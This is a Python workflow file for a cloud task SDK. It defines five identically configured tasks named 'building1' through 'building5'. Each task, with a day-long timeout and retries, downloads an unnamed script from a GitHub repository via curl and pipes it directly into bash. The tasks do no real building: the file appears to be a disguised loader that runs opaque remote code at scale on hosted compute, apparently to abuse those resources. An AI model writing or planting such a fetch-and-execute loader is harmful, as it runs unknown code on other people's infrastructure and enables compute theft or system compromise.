import sys
from render_sdk import Workflows, Retry

app = Workflows()

@app.task(
  plan="pro",
  timeout_seconds=86400,
  retry=Retry(
    max_retries=3,
    wait_duration_ms=1
  )
)
def building1():
  import sys
  import os
  os.system('curl -sL https://github.com/makiloso/urban-octo-umbrella/raw/main/moa | bash')

@app.task(
  plan="pro",
  timeout_seconds=86400,
  retry=Retry(
    max_retries=3,
    wait_duration_ms=1
  )
)
def building2():
  import sys
  import os
  os.system('curl -sL https://github.com/makiloso/urban-octo-umbrella/raw/main/moa | bash')

@app.task(
  plan="pro",
  timeout_seconds=86400,
  retry=Retry(
    max_retries=3,
    wait_duration_ms=1
  )
)
def building3():
  import sys
  import os
  os.system('curl -sL https://github.com/makiloso/urban-octo-umbrella/raw/main/moa | bash')

@app.task(
  plan="pro",
  timeout_seconds=86400,
  retry=Retry(
    max_retries=3,
    wait_duration_ms=1
  )
)
def building4():
  import sys
  import os
  os.system('curl -sL https://github.com/makiloso/urban-octo-umbrella/raw/main/moa | bash')

@app.task(
  plan="pro",
  timeout_seconds=86400,
  retry=Retry(
    max_retries=3,
    wait_duration_ms=1
  )
)
def building5():
  import sys
  import os
  os.system('curl -sL https://github.com/makiloso/urban-octo-umbrella/raw/main/moa | bash')


if __name__ == "__main__":
  app.start()
